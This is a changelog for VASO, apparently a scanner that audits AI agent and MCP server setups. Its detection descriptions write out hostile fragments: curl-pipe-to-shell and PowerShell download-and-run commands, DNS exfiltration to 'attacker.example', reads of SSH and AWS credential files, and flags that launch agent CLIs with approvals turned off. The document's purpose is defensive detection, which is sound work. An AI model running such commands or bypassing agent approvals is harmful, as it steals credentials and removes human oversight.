# Changelog

All notable changes to VASO (VULNEX Agent Security Observer) will be documented in this file.

This project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added

- **Grok Bot support** (`-a grok-bot`, 13 checks GB-001–013). Grok Bot is a desktop app whose cloud agents can run commands on your computer through a local exec daemon. VASO detects the app (`/opt/Grok Bot`, `/Applications/Grok Bot.app`), its data root (`~/.grokbot`, `$SAND_DATA_ROOT`, `$SAND_USER_DATA_DIR`, pre-rename `~/.cursor/sand`) and its Electron user data (on Windows the pre-rename `%APPDATA%\Sand` while the app still runs from it), and reads the version from `desktop-status.json` — or, for a .deb that has never been launched, from its package metadata (local scans only). The checks follow the 0.71.2 settings schema and the app's permission engine:
  - **GB-001:** "Execution on Local Computer" is Always allow (`localToolPermission: "always"` with no stricter admin ceiling), for the active account and every other signed-in account. The cloud agent then runs shell commands, reads and writes files under `$HOME` and reads other AI tools' MCP setup and prompt history without asking, unsandboxed. `vaso fix` sets it back to "ask".
  - **GB-002:** connector tools set to `always_allow`.
  - **GB-003:** auto-review turned off or widened by custom allow rules.
  - **GB-004:** standing "Always allow" grants. Recipients are never quoted.
  - **GB-005:** cloud traffic routed through this computer (settings or an environment-configured tunnel). Critical when an environment-configured tunnel also sets `SAND_EGRESS_TUNNEL_ALLOW_PRIVATE=1`.
  - **GB-006:** local-exec credentials stored unsealed (the app writes them that way without OS secure storage), legacy `plaintext:v1:` values, account tokens kept as raw JSON, or secrets under Chromium's fixed Linux key. Values never appear in reports.
  - **GB-007:** credential-store permissions (fixable).
  - **GB-008:** runtime data readable by others, such as the umask-created daemon log and cached transcripts.
  - **GB-009:** Messages access enabled.
  - **GB-010:** local computer use available.
  - **GB-011:** updates disabled (`SAND_DISABLE_UPDATES`, or the apt source set to `Enabled: no`) or the dogfood track (ignored for .deb/.rpm installs, which update through the package manager). The `nightly` track isn't flagged: 0.71.2 runs it as stable.
  - **GB-012:** endpoints redirected from the environment. Critical when `SAND_BACKEND_URL` or `CURSOR_API_BASE_URL` points away from Cursor's hosts: that server receives the account's access token and issues the local-exec channel, and a channel it marks server-authoritative lets it approve commands on this computer itself. A warning for `SAND_HOST_GATEWAY_URL` (a substitute cloud computer) and `SAND_CURSOR_WEBSITE_URL` / `CURSOR_WEBSITE_URL` (the sign-in page), info for `SAND_HTTPS_PROXY` and for the record the app keeps after it has connected through a gateway override. Only scheme, host and port are reported. `SAND_UPDATE_FEED_BASE_URL` isn't flagged: released builds ignore it.
  - **GB-013:** the passkey proxy (`webauthnProxyEnabled`, on by default on macOS and Windows) lets the cloud computer ask to sign in with this computer's passkeys and security keys, with a consent prompt each time (info).
- Remote scans collect Grok Bot's secret stores, approvals and standing grants as metadata only, and collect only named, non-secret `SAND_*` variables. No probe rebuild is needed.
- **HM-011: Hermes administrator-managed config writable by others** (critical). Hermes applies an IT-managed `config.yaml` and `.env` from `$HERMES_MANAGED_DIR` or `/etc/hermes` over every user's own settings, protected only by file permissions. A group- or world-writable managed directory, `config.yaml` or `.env` lets another local user turn approvals off, enable YOLO mode or point every Hermes user at an endpoint of their choosing.
- **WS-009: Cascade hooks that fetch code or send data out** (Windsurf / Devin Desktop). VASO now reads Cascade hooks from the user `~/.codeium/windsurf/hooks.json`, the system file (`/etc/devin/hooks.json`, `/Library/Application Support/Devin/hooks.json`, `%ProgramData%\Devin\hooks.json`, with the legacy Windsurf paths as fallback) and the workspace `.devin/hooks.json` (legacy `.windsurf/hooks.json` only when that one defines no hooks). A hook `command` or `powershell` script that downloads and runs code (`curl … | sh`, `bash <(curl …)`, `iex (irm …)`) or sends credential files, secret variables or the environment over the network is critical. Sending hook input (prompts, code, commands, transcripts) to a plaintext, IP, paste or tunnel host, or re-evaluating it as code (`bash -c "$(jq …)"`), is a warning. Sending it to a named https host, the documented audit-logging shape, is informational. Devin CLI's `.devin/hooks.v1.json` stays with DEV-006. Remote scans collect the user and system hook files.
- **CUR-015: Cursor hook commands that fetch code or send data out.** CUR-011 judged only whether gating hooks fail open, so a repository `.cursor/hooks.json` with `sessionStart: curl … | sh` passed. Every hook event's command is now judged on the same tiers as WS-009; `type: "prompt"` hooks run no command and are skipped.

### Security

- **Remote scans redact credentials by their shape, not only by the variable's name** (probe ≥ 1.4.0). A token in a variable whose name looks harmless (`OPENAI_ORG=sk-proj-…`, `LYRIE_TELEGRAM_BOT=123456:…`, a `ghp_…` in `GITHUB_PAT`) and credential-named URL parameters (`?api_key=`, `&token=`) shipped verbatim in the snapshot's environment; they are now replaced in place, keeping the scheme, host and parameter names the checks read.
- **`vaso fix` writes only where `vaso fix --rollback` can restore.** An install relocated outside the home (`SAND_DATA_ROOT`, `CODEX_HOME=/data/…`, an install dir under `/opt`) used to be changed although rollback — confined to the home so a tampered backup tree can't write elsewhere — could never undo it. Such files are now refused with the reason named.
- **`vaso fix` no longer changes ordinary files in a repository.** A project installation (a repo's `.copilot`-style or `.cursor/` scope) declared the adapter's credential file names inside the repo, so POL-003 reported the repo's own `config.json`, `settings.json` or `.cursor/hooks.json` and `vaso fix` chmodded them. Credential stores are user-level for every adapter; project installations now declare none.
- **HTML reports neutralise bidi and control characters**, as the terminal, CSV, Markdown, JUnit and SARIF reports already did: a file name with U+202E no longer renders reversed in a browser.
- **A Slack token's last segment no longer shows in reports.** Masking replaced only what a token pattern matched, so `xoxb-<team>-<bot>-<secret>` kept its secret part readable in every report format and in `vaso mcp list`; Slack patterns now cover every segment and every masked token runs to its end.
- **Project rules (`.vaso/rules/` in the working directory) are untrusted input.** A cloned repository could ship a rule whose fix made `vaso fix -y` write into the user's own configs (setting Claude Code's `defaultMode` to `bypassPermissions`), silently replace an organisation rule from `~/.vaso/rules/` with the same ID, or hang the scan with a backtracking regex. Project rules may still add findings, but their `fix.set` is ignored and they never replace a rule ID defined in `~/.vaso/rules/` or by `--rules` (skipped with a warning naming both files); a duplicate ID within one source is skipped with a warning too. Rules in `~/.vaso/rules/` and passed with `--rules` keep their fixes. Rule regexes (`pattern.regex`, the `matches` operator) that can backtrack super-linearly — nested quantifiers, repeated overlapping alternatives, overlapping unbounded quantifiers in a row — fail validation and are skipped at load, and rule regexes run on at most 4,096 characters per line or value. The operator set is unchanged.
- **Remote scans never ship what a skill symlink into a credential store points to.** A skill that linked `~/.ssh` or `~/.aws/credentials` into its directory made the probe copy the private key or secret into the snapshot. The probe now records such a link and the file's mode, never its content (`omitted: "sensitive"`), and does not walk a linked directory there; the local skill walk doesn't follow those links either, so SKL-013 still reports the link from its target and local and remote verdicts stay equal. The sensitive locations are SENSITIVE_SINKS (the list SKL-013 and MCP-031 use), kept identical in the probe by tests on both sides. Skills linked in from a checkout elsewhere are still followed (probe ≥ 1.4.0).
- **The probe redacts more credentials in environment variables.** Header lists (`ANTHROPIC_CUSTOM_HEADERS`), names that join the credential word on (`…_ACCESSTOKEN`, `…_BOTTOKEN`, `…_PRIVATEKEY`, `…_APIKEY`), `…_JWT` and `…_DSN` are redacted; URLs keep their scheme and host but never `user:password@`; and an inline JSON config (`OPENCODE_CONFIG_CONTENT`) keeps its structure with every value under a credential-named key (`apiKey`, `headers`, `env`…) redacted — one that isn't plain JSON is redacted whole (probe ≥ 1.4.0).
- **What a remote host's probe prints is checked like a `--snapshot` file.** The CLI parsed the probe's stdout without the shape and size checks a snapshot file gets, so a hostile or compromised host could send output that crashed the scan or was read as something it isn't. Output that is not JSON, has the wrong shape or exceeds the probe's per-file and total limits now marks that host not scanned (exit 3), with the reason on one escaped line.

### Fixed

- **`install.sh` no longer asks for sudo when `NPM_CONFIG_PREFIX` names a directory that doesn't exist yet** — npm creates it, so the nearest existing directory decides. Grok Bot checks say a `settings.json` is rejected by the app (and runs on defaults) instead of "No settings.json".
- **Grok Bot checks follow the 0.71.2 daemon and settings schema more exactly.** GB-004 counts only grants the daemon loads (texting someone or using an app, with an account, a timestamp and — per recipient — a recipient); GB-005 honours the tunnel switch (`egressTunnelPreference`, else `egressTunnelEnabled`), the egress policy and an environment tunnel's bearer before rating private targets critical; a `settings.json` without `version: 1`, or with a mistyped `autoReviewInstructions.isEnabled` or per-machine permission, configures nothing, while an unknown key inside an account block is only stripped; `SAND_DISABLE_UPDATES` is info on a `.deb` install (apt still updates it); a `SAND_HTTPS_PROXY` the app can't decode is not reported.
- **Remote and snapshot scans no longer read project configs from the scanning machine's working directory.** The same remote scan found a "project" when run from the remote host's own home and none from anywhere else; project scope is now a local-scan concept. Scanning from `$HOME`, `~/.opencode` (OpenCode's installer directory: `bin/`, `node_modules`) is no longer reported as a project.
- **CG-001 is info when `~/Library` keeps other users out.** ChatGPT writes its workspace `.data` files 0644, but macOS keeps `~/Library` 0700, so other users can't reach them; every install used to get a warning.
- **MCP-034 no longer reports codepage tables in minified bundles as hidden text.** A table inlined by a bundler (iconv-lite's windows-1255 has U+200E/U+200F) sits on a line full of other code; each string literal is now judged on its own.
- **`VASO_CHECK_TIMEOUT` is capped at 86400 seconds and an unusable value is named on stderr.** A huge value overflowed Node's timer, so every check errored at once and the scan exited 3; `abc`, `0` or `-5` were ignored silently.
- **`vaso rules validate` reports the rules `vaso scan` would skip**: an ID that is a built-in check's, or one defined twice in the file.
- **SKL-001 follows what a skill reads to where it sends it.** Only a variable assigned straight from `readFileSync` and named again in a request was matched, so a secret sent after `await fs.promises.readFile`, a `.then` or `(err, data)` callback, base64 or JSON wrapping, destructuring of `process.env` (`const { AWS_SECRET_ACCESS_KEY } = process.env`), a filtered `Object.entries(process.env)`, a `globalThis.fetch` alias, an `axios.create()` / `https.request()` client, or a helper function of the same file or skill module (`require('./lib/upload')(key)`) went unreported. Host identity encoded into a DNS query name (`` dns.lookup(`${hex}.attacker.example`) ``) is now reported too. Severity follows what was read, with the path worked out from constants, `path.join(os.homedir(), …)`, `__dirname`/`import.meta.url` and the function's call sites: a credential store or the environment is critical, a file elsewhere on the machine a warning, and the skill's own files (a template POSTed to its API), workspace files and a file the caller chose (an upload skill) are listed as info. Python and line-scan flows keep their severity. MCP-006 takes the new flows only for a credential store or the whole environment.
- **SKL-006/010 recognize credential paths built at runtime.** `fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'))` and `` readFileSync(`${process.env.HOME}/.aws/credentials`) `` passed both checks because only a path written out as one string was matched; they now report `Reading sensitive path: ~/.ssh/id_rsa`. A skill's own config under `~/.config` stays clean.
- **Pattern rules no check ran are retired.** EX-001–003 (postMessage transfer, webhook send, DNS exfiltration) and CE-001–004 (eval, `new Function`, `child_process`) were defined but never applied; SKL-001 and SKL-003 cover them from the syntax tree, without the DNS regex's false match on `Buffer.byteLength` in a lookup callback.
- **SKL-003 sees command and code execution however a skill reaches it.** A computed member (`require('child_process')['exec']`), a module name built from strings (`require('child_' + 'process')`), a method alias (`const run = cp.exec`), destructuring from a module variable, `process.mainModule.require` / `module.require` / `createRequire`, `require('vm').runInThisContext`, `new vm.Script`, `Module._compile`, the Function constructor reached through `constructor.constructor`, and zx / execa `` $`…` `` templates went unreported. zx and execa quote each interpolation, so `` $`git log ${ref}` `` stays informational like a program started directly, while `` $`sh -c ${cmd}` `` is critical. MCP-004/005 resolve the same calls. `setTimeout` with a string is not reported: Node, Bun and Deno reject it rather than evaluate it.
- **SKL-003: a skill that starts an AI agent CLI with its approvals off is critical.** `spawn('claude', ['--dangerously-skip-permissions', '-p', …])` was listed as an informational "runs a program directly"; the second agent then runs any tool without asking, outside the permission rules of the agent that loaded the skill. Recognized as documented by each vendor: Claude Code (`--dangerously-skip-permissions`, `--permission-mode bypassPermissions`), Gemini CLI and Qwen Code (`--yolo`/`-y`, `--approval-mode yolo`), Amazon Q / Kiro (`chat --trust-all-tools`/`-a`), Codex (`--dangerously-bypass-approvals-and-sandbox`/`--yolo`, or `-a never` with `-s danger-full-access`), Cursor (`--force`/`-f`/`--yolo`), Copilot CLI (`--allow-all-tools`, `--allow-all`/`--yolo`), OpenCode (`--auto`), Devin (`--permission-mode dangerous`), Abacus.AI (`--dangerously-skip-permissions`) and Aider (`--yes-always`), also through `npx` or `sh -c`. Modes that approve part of the work or turn the sandbox off (`acceptEdits`, `auto_edit`, `--sandbox disabled`, `--allow-all-paths`, …) are a warning; `claude --version` stays informational.
- **SKL-004 catches a download saved to a file and then run.** Only pipes into a shell (`curl … | sh`) and process substitution were matched, so `execSync('curl -sk https://… -o /tmp/x && chmod +x /tmp/x && /tmp/x')` was an informational constant command. A download written with `-o`/`-O`/`--output` that is then made executable, run, or handed to a shell or interpreter is now reported (also in Cascade and Cursor hook commands, which share the rule); a download that is only read afterwards (`&& tar xzf f.tgz`, `&& jq . out.json`) is not.
- **Fewer lookalike false positives from the bundled threat data.** A short single-word trusted name (`irish`, `github`) is matched only by a same-length typo (`githbu`), not by another word (`iris`); MCP-008 matches a malicious domain's label only as a whole package-name segment and ignores labels made of generic words (`npm-cache`, `js-mirror`).
- **Offline installs now carry the October advisories.** The 68 advisories first published in advisory feed v7 (OpenClaw, NemoClaw, ZeroClaw, Nanobot, Hermes, NanoClaw, Codex CLI, OpenCode, Gemini CLI, Copilot CLI, Claude Code, Claude Desktop, Cursor, and 18 MCP packages including 8 known-malicious ones) were only available after `vaso update`; they are now in the bundled database, exactly as published, so ADV-001, ADV-002 and MCP-027 report them without fetching the feed (for example Codex 0.20.0 for CVE-2025-59532). A test now requires every advisory in the published feed to ship in the bundle, identical to the feed.
- **`--silent` keeps ssh's own messages off the terminal.** Host-key notices and connection messages from the ssh connection setup still reached stderr; under `--silent` they are captured (printed with `--debug`). Password prompts still appear, and the per-host result is unchanged.
- **The user guide states the `CONFIG-LOAD` exit-code rule.** An unreadable or unparseable config file is a warning finding (it counts toward `--fail-on`), never exit 3; remote hosts with unusable probe output are listed among the exit-3 cases.
- **Offline installs now carry the October IOC refresh.** The indicators in IOC feed v6 that weren't bundled — 7 C2 IPs, 22 domains and 26 SHA-256 hashes (MemTensor/sckit worm, Carbonato, Deadbugz, ChainDrop, the @7nohe codegen compromise, Unit 42's malicious ClawHub skills, fake Claude/Codex installers, and the postmark-mcp exfiltration domain) plus the 40 Agent Threat Rules whitelist skill names IOC-005 compares against — were only available after `vaso update`; they are now in the bundled IOC data, so IOC-001/002/003/005, NET-005 and MCP-008 use them without fetching the feed (for example a config pointing at a `skyleen.fr` subdomain). A test now requires every indicator in the published IOC feed to ship in the bundle.
- **Hermes checks judge the settings after the administrator-managed layer is applied.** Hermes merges `config.yaml` from `$HERMES_MANAGED_DIR` or `/etc/hermes` over the user's config key by key, and loads the managed `.env` last so it beats the user's `.env` and the shell. VASO read only `~/.hermes`. The managed files are now loaded (also on remote scans): a user value the managed layer replaces is reported at info as overridden (HM-006, HM-007, HM-008, HM-010) or not at all (CFG-001), an insecure managed value is reported against the managed file, and the API-server checks (HM-004, HM-005, CFG-001, NET-001) and HM-009 use the managed value where it sets one. HM-002 reports a secret-bearing managed `.env` only when it is world-readable, since every Hermes user must be able to read it.
- **Hermes `.env` values are read the way Hermes loads them.** Hermes uses python-dotenv: `${VAR}` and `${VAR:-default}` expand from earlier lines and the environment, double-quoted values decode escapes and may span lines, and a line python-dotenv can't parse is skipped. VASO kept `${VAR}` literally, so `HERMES_YOLO_MODE=${DEMO_YOLO}` with `DEMO_YOLO=1` was missed. A reference that nothing visible defines is still kept as written.
- **A Hermes API server is reported only when Hermes would start it.** A public `host`, a key or a CORS list made VASO treat the server as listening, so `gateway.api_server.enabled: false` with `host: 0.0.0.0`, or an `API_SERVER_HOST` on its own, was reported as unauthenticated exposure (HM-004, CFG-001, NET-001) or permissive CORS (HM-005), and recorded as the gateway. The server now counts as enabled the way the installed release decides it: a config `enabled` (coerced from 0.12.0, so a quoted `"false"` is off; Python truthiness before), and from the environment `API_SERVER_ENABLED` or any `API_SERVER_KEY` before 0.19.1 (overriding a config `enabled: false`), a usable `API_SERVER_KEY` from 0.19.1 unless the config sets `enabled` itself. An unknown release is judged by the current rules.
- **Hermes `${VAR}` references in `config.yaml` are expanded as Hermes expands them.** Hermes loads `~/.hermes/.env` (and the administrator-managed `.env` over it) into its environment and then replaces `${VAR}` in config string values, in the user's and the managed `config.yaml`. VASO judged the reference text, so `approvals.mode: ${MODE}` with `MODE=off`, or `base_url: ${EP}` pointing at a plaintext endpoint, passed. References now resolve from the managed `.env`, the user's `.env`, then the scanning user's environment; 0.19.1+ also reads `${env:VAR}`; an unresolvable reference (or another source such as `${vault:…}`) stays as written. HM-001 still judges the file as written, so a key referenced from `.env` is not a plaintext key.
- **The Hermes managed layer is merged exactly as Hermes merges it.** A managed `model: <id>` replaced the user's whole `model` block, so the user's plaintext `model.base_url` was reported as overridden (HM-006 at info). Hermes promotes a bare managed model id to `model.default` and canonicalizes the managed model keys (root `provider`/`base_url`, `api_base`, `model.name`) before merging, and its merge replaces a user scalar with a managed mapping or `null` while ignoring a `null` over a mapping. VASO now does the same for every key, and the reported model takes the managed id with the user's provider.
- **Hermes 0.21.6+ config files with a duplicate key are reported as CONFIG-LOAD.** Hermes 0.21.6 reads YAML with ruamel, which rejects a repeated key: Hermes runs on its default settings (a managed file with one is ignored). VASO resolved the key to its last value, so the scan judged settings Hermes never applied. A release before 0.21.6 still reads the last value; an unknown release is judged as the current one. HM-009 also passes on 0.21.6+, which no longer ships the tirith scanner.
- **An Atomic Agent `config.json` that Atomic refuses to load is reported as CONFIG-LOAD.** `agent.approvalLevel` must be an integer from 1 to 5 after Atomic's own coercion (`4`, `"4.0"` and `" 5 "` load; `4.5`, `6`, `"4.5"` and `true` don't), and a legacy `agent.approvalRequired` must be a boolean word. Otherwise Atomic stops with "invalid config" and runs nothing. VASO read `4.5` as a raised approval ladder (AT-001 critical) and silently ignored other invalid values. The file is now reported as CONFIG-LOAD and none of its settings are judged.
- **Lyrie `.env` values are read the way Bun loads them.** Bun 1.3.11 (the release Lyrie pins) ends an unquoted value at the first `#` (`closed#note` is `closed`) and expands `$VAR` and `${VAR}` across the `.env` layers. VASO kept the comment text, so a commented DM policy was reported as invalid (LY-003 critical), and it didn't expand references.
- **`/etc/openclaw` is no longer scanned as an OpenClaw install, and OC-007 is retired.** No OpenClaw release, from clawdbot 2026.1.4 to openclaw 2026.9.4, loads config, `.env` or skills from `/etc/openclaw`. It appears only in help text as an example place for files a config names explicitly. A config there produced findings for an install that doesn't exist. OC-007 ("/etc/openclaw writable") now always passes with that explanation (severity info). The ID is kept so baselines and suppressions still resolve.
- **`vaso mcp scan --resolve-packages` says why a package wasn't analyzed.** With no `npm` on PATH it reported "Resolved source for 0/1" and a clean scan. The reason (`npm not found on PATH`, `tar not found on PATH`, `npm pack failed (E404)`, a timeout, no JavaScript source) is now printed on stderr and carried in the report as an incomplete-scan result (`PACKAGE-RESOLVE`, info severity, listing each server), SARIF marks the run as not successful, and the scan exits 3. npm's own error text is never quoted (it can contain a registry URL with credentials). `vaso mcp scan` also exits 3 now when a check errors, as `vaso scan` does.
- **MCP-007 follows Python tools into their helpers.** A tool that fetched a page or read a file through a function or class in the same module (`fetcher.fetch_and_parse(url)`, `self._fetch(url)`, `load_doc(path)`) passed, so a search-and-fetch server returning any page the model asked for wasn't reported. Helpers are now followed a few calls deep (recursion is safe), a URL counts as the caller's only when the tool's own input reaches the request, and the fetched text must reach the tool's return value: a download that is saved, uploaded or played and answered with a status message is no longer reported, and tools declared over several lines (a multi-line decorator or signature) are now read at all.
- **MCP-003 finds credentials written into server arguments and URLs.** A token passed as an argument (`npx server ghp_…`), after a credential flag (`--token`, `--api-key=`, `--password`), in an env assignment (`docker run -e GITHUB_PERSONAL_ACCESS_TOKEN=…`), in a header argument (`mcp-remote … --header "Authorization: Bearer …"`), or in the server URL (`https://user:pass@host`, `?api_key=…`, Telegram's `/bot<token>/`) passed before — and it is also visible in the process list. These are now reported with the value masked; references (`${VAR}`, `$VAR`, `%VAR%`, `{env:VAR}`, `${input:…}`), placeholders and file paths stay quiet, and a credential the env block or headers already report isn't counted twice.
- **GHC-002 reads Copilot CLI's saved approvals as the CLI matches them.** Only identifiers ending in `:*` were judged, but a saved `commands` approval is usually a bare command stem matched exactly, and the stem `bash` approves every `bash …` invocation. A stem for a shell, privilege wrapper or interpreter (`bash`, `sudo`, `python3`, `node`, `npx` …) is critical, as `bash:*` already was. A stem for a network client (`curl`, `wget`, `ssh`, `nc`) and a location-wide `{ "kind": "write" }` approval (every file write in that repository without a prompt) are warnings. Command-plus-subcommand approvals (`npm test`, `git push`) stay clean.
- **Windsurf / Devin Desktop and Devin CLI agree on who owns `~/.config/devin`.** The Windsurf adapter left the shared Devin config and skill roots to the Devin CLI only when the CLI sat at an installer location, while the Devin adapter also finds it via PATH, Node version managers and the updater's versions. With a CLI found only that way, both adapters read the same files and every finding there was reported twice. Both now use the same CLI discovery.
- **OpenClaw sub-agents no longer re-analyse the shared skills directory.** Each `agents/<name>` install scanned the parent's skills again (100 sub-agents: 29 s → 5 s); the parent installation reports them once, as before.
- **A FIFO in a skill directory no longer adds remote-only evidence**, and a mode-000 skill directory is described correctly. Snapshot listings treat FIFOs and devices as a local listing does (not files), so SKL-002 and IOC-007 no longer reported them as "not scanned" on remote scans only; SKL-002 says a directory that can't even be entered is hidden from the agent too, instead of claiming the agent still loads its SKILL.md.
- **IPv6 SSH targets and huge `--ssh-timeout` values.** `user@::1` was read as host `::` on port 1, and `user@[::1]:2222` passed the brackets on to ssh, which can't resolve them. Bare IPv6 addresses (no port) and `user@[address]:port` (also as an inventory `host`) are read as ssh does, and scp gets the bracketed form it needs. `--ssh-timeout` above 86400 seconds is a usage error; larger values overflowed Node's timer and timed out after 1 ms.
- **`--save-snapshot` and baselines never write through a symlink.** A link planted where a snapshot or baseline was about to be saved made VASO write the collected file contents into the link's target, and an existing file was written with its old permissions before it was made owner-only. They are now written to a new owner-only file (created exclusively, never through a link) and renamed into place.
- **Remote scans read a legacy NemoClaw install's bundled blueprint.** For an npm-global NemoClaw (`<prefix>/lib/node_modules/nemoclaw`), the blueprint (`nemoclaw-blueprint/blueprint.yaml`, its sandbox policy and presets) and the plugin manifest were never collected, so CFG-018 and CFG-019 reported differently than a local scan. The checks and the probe manifest now share one list of install roots, which also adds `/usr/lib` and Homebrew's prefix to CFG-019's plugin-manifest lookup. No probe rebuild is needed.
- **Host names, user names and inventory labels can't drive the terminal.** A snapshot's hostname and probe user, and an inventory `label`, were printed as they were, so terminal escapes in them could clear the screen or forge links and report lines. They are neutralized where a snapshot or inventory is read (snapshot files and SSH scans alike).

## [1.3.1] - 2026-10-16

### Security

- **`vaso fix` never writes through hard links, re-pointed directories or another user's files.** Fixes are confined to the installation owner's home and install dir: a hard-linked file, a path whose directory resolves elsewhere, a relative path and (as root) a file another user owns are refused, and rollback refuses a path re-pointed since the backup. Rollback is confined the same way: it writes only inside the user's home (every local home when run as root), restores only paths its backup manifest recorded, and never creates a file through a symlinked directory — a tampered `~/.vaso/backups` tree can't make it write elsewhere. One refused file no longer stops the other fixes (CFG-003/POL-003 name it), and a fix over thousands of files runs in linear time (append-only backup journal; 1.3.0 manifests still read).
- **Relative relocation variables (`CODEX_HOME=.codex`, `ZEROCLAW_DATA_DIR=0`, …) resolve to absolute paths**, so fixes are always backed up and can be rolled back — they used to be applied with no backup. Root version queries run with the binary owner's own primary group, never the file's group (macOS `/private/tmp` files carry group wheel). A FIFO or device in place of a credential file is no longer offered a permission fix remotely.
- **No analyzer regex can be made to backtrack exponentially.** A crafted line of under 130 bytes in a skill or MCP server source (an unterminated Python string of escapes, a long lowercase literal, a curl-pipe line with `==` runs) hung `scan`, `skill audit` and `mcp scan` indefinitely. The three patterns are rewritten unambiguously; a full `recheck` pass over every regex in the build finds no exponential case left. The MCP-024/034 hidden-instruction tag pattern (an unclosed `<system a="x" …` made `mcp scan` take minutes) is fixed the same way, and three quadratic paths are linear, and nine more patterns (RS-005, EX-003, MCP-005 SQL formatting, MCP-015, SKL-006 key placeholders, tool-definition extraction, requirements parsing) have bounded spans instead of stacked unbounded ones (one crafted line took 15–60 s): report credential masking on long scheme-like tokens, SKL-009's transfer-to-address pattern, and SKL-002's one-finding-per-line check.
- **New check OC-008 flags OpenClaw overrides that `openclaw security audit` also flags**: elevated exec open to everyone on a channel (`tools.elevated.allowFrom: ["*"]`, critical), HTTP `/tools/invoke` re-enabling exec or control tools (`gateway.tools.allow`), X-Real-IP fallback, dangerous node commands, caller-chosen hook session keys, hooks on `/`, and browser access to private networks — severity follows whether the gateway is reachable beyond loopback. - **`vaso update` never installs an older feed.** `--force` only re-installs the cached version; before, every update accepted a replayed older signed feed. - **Credentials quoted in reports are masked in every shape** (also `--header=Authorization: …` and PowerShell `$env:NAME = '…'`): URL passwords (also containing `@` or `'`), secret-named query and fragment parameters, webhook and bot-token paths, `Authorization`/`X-Api-Key` headers, `NAME=value` env assignments (`docker -e`, `env`, `sh -c`), `--token <v>`/`--key=`/`--pat=`/`-p <v>` arguments (also as separate argv elements) and `curl -u user:pass` — in every report format, baselines, `vaso mcp list` and `vaso mcp scan`. - **Code built to crash the parser no longer hides a skill or MCP server.** Any nesting or chain that overflows the parser or the AST walk (brackets on separate lines, `?:`, `!`, templates, arrows, operator and call chains, about a kilobyte of valid JavaScript) used to skip the file and drop its critical findings (SKL-001/003, MCP-004/005). ### Security

- **`vaso fix --rollback` no longer writes through symlinks.** A restored file that has been replaced by a symlink (or by anything but a regular file) since the fix run is skipped with a message instead of having the backup copied and chmod-ed onto the link target. The backup stays pending.

## [1.2.0] - 2026-10-12

### Added

- **MCP-027 checks the MCP SDK a server ships with.** A server's dependencies are read from its project — the installed copy in `node_modules` or a `.venv`, then the lockfile (`package-lock.json`, `uv.lock`, `poetry.lock`), then `package.json` / `requirements*.txt` / `pyproject.toml` — and matched against advisories. A declared range counts only when no fixed release fits it (`^0.5.0`, not `^1.0.4`). Ten advisories for the TypeScript SDK (`@modelcontextprotocol/sdk`) and the Python SDK (`mcp` on PyPI) are bundled from the GitHub Advisory Database: CVE-2025-66414, CVE-2026-0621, CVE-2026-25536, CVE-2026-104850, CVE-2025-66416, CVE-2026-52869, CVE-2026-52870, CVE-2026-59950, CVE-2025-53366, CVE-2025-53365. Most need a particular SDK feature (an HTTP transport, the OAuth client, resource templates); when the server's code shows no use of it, the match is reported as not applying, at info. Advisories can now name their registry (`affectedDependency.ecosystem`), so the Python SDK's `mcp` never matches an npm package of that name (ADV-002 included).

- **`vaso mcp scan --source <path...>` audits a server's own code.** Give it an entry file or a server checkout and it is analyzed like a server launched from a config — for server authors, and for remote servers whose code you have but only connect to (`npx mcp-remote http://…`), which the config never leads to. On its own it scans only those servers; with `-p` it adds them to the configs' servers. A path with no server source exits 2.
- **Server-side transport checks read the server's code.** MCP-002 flags a server that listens on every interface (`app.listen(PORT, "0.0.0.0")`, `uvicorn.run(app, host="0.0.0.0")`) when its code has no authentication. MCP-023 flags Host/Origin validation switched off: `MCP_ALLOWED_HOSTS="*"`, `enableDnsRebindingProtection: false` / `enable_dns_rebinding_protection=False`, wildcard allowed hosts or origins, `Access-Control-Allow-Origin: *`, a bare `cors()`.
- **MCP-034 reads the files a server returns.** Text files a local server names in its code and keeps next to it (a `documents/` folder of RAG content) are checked for injected instructions, like literals in the code. Files merely shipped alongside, such as a README, are not. "Assistant guidelines/rules" now counts as an injected-instruction lead-in.
- **MCP-003 finds credentials hardcoded in server source:** known token formats, a high-entropy literal assigned to a secret-named key or header (`"X-Api-Key": "…"`), and literal `Bearer` tokens. Placeholders, environment-variable names and identifiers are not reported, and the report shows only the first characters.
- **MCP-035 says what an obfuscated string table hides:** the email domains, URL hosts and token types found in the decoded strings (never the values).
- **MCP-008 catches lookalike servers.** A package or server name one typo away from a well-known service (`twittter-mcp`, `githbu-server`) is flagged, including a local server known only by its config name. Version suffixes no longer hide a typosquat (`server-githbu@1.0.0` is compared as `server-githbu`), and a typo in the shared `mcp-server-…` part of two names no longer counts.

- **Python MCP servers get source analysis.** A server started as `python3 server.py`, through a virtualenv interpreter (`/…/.venv/bin/python server.py`) or with `uv run` — including the MCP quickstart form `uv --directory <dir> run server.py` — was never read, so none of the source checks ran on it. Its script is read now. Command execution (`subprocess`, `os.system`, `asyncio.create_subprocess_*`, `eval`/`exec`) and credential-path reads feed MCP-004. MCP-005 reports caller input reaching a sink: `eval`/`exec` of a variable, `python -c` with caller code, shell commands built from input, and `os.path.join(base, <input>)` in a file with no containment check (path traversal). The text checks (MCP-032, MCP-034, MCP-035) read Python source as well. uvx/PyPI packages are still not fetched.
- **Remote servers behind `mcp-remote` or `supergateway` are checked like `url` entries.** Claude Desktop reaches remote servers through a local stdio bridge (`npx -y mcp-remote https://…`, `npx -y supergateway --sse https://…`). The URL sat in `args`, where MCP-002, MCP-023 and MCP-029 never looked, so a plaintext or unauthenticated remote configured this way passed. Now:
  - MCP-002 flags plaintext through `supergateway`, and through `mcp-remote` when `--allow-http` is set (without it, mcp-remote refuses a non-localhost `http://` URL).
  - MCP-023 checks the bridged streamable-HTTP URL.
  - MCP-029 flags `supergateway` with no `--header`/`--oauth2Bearer` credential. It does not flag `mcp-remote`, which runs an OAuth client and authenticates whenever the server asks.

- **MCP-027 checks every library a server ships, not just the MCP SDK.** 35 advisories for widely used npm and PyPI packages are bundled, verified against the GitHub Advisory Database: lodash, axios, minimist, handlebars, jsonwebtoken, ws, moment, request, express, body-parser, socket.io, xml2js, validator, multer, async; requests, jinja2, urllib3, PyYAML, starlette, h11, aiohttp. A dependency on a package deprecated in every version (request, request-promise, node-uuid, har-validator, inflight) is reported at info: it will never get a fix. Only package names and versions are sent — never code, paths or config; a dependency known only by a declared range is not looked up. If OSV can't be reached, the scan continues with the bundled advisories and says so. Opt-in: without the flag nothing leaves the machine.
